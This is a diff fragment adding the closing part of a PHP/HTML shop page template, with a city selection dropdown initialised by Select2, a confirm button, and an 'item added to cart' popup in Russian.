+	<option value="<?=$key?>"><?=$val?></option>
+<?};?>
+</optgroup>
+</select>
+<script type="text/javascript">
+$(document).ready(function() {	
+	$('#jselect2').select2();
+    $('section').css( 'min-height', '699px' );
+});	
+</script>	
+<a href="javascript:void();" onclick="submitCityForm(); return false;" id="CITY_CONFIRM_BUTTON" class="b-block grn-btn">Ок</a>
+</form></div>
+		</div>
+		<div class="b-modal_inner" data-modal="add2bsket-popup">
+			<a href="#" class="b-close"></a>
+			<div class="b-inner">
+				<div class="b-title">Товар добавлен в корзину</div>
+			</div>	
+		</div>	
+	</div>
+</div>			
+<!---(popup)--->
+
+
+
+</body>
+</html>
